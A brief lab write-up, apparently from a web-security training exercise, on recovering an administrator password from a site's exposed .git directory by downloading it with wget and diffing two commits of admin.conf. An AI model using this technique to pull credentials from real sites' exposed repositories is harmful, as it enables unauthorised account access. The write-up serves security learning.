# Lab: Information disclosure in version control history

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`.

Analysis :

after installing the ./git file using wget -r url

i was struggling to to find a way to configure my machine to treat it as a repo so i found a work around that let's me still access the previous commits
using

> syntax : git diff "sha for commit 1" "sha for commit 2"

```git diff 5dd44f17b7c55adae2ee98783a13630663d19455 7417ea9e1564a13ba5b7e35d79d37f5fe425407e
diff --git a/admin.conf b/admin.conf
index 21d23f1..1a43614 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+ADMIN_PASSWORD=woeav9on6pbg86dztzeq```
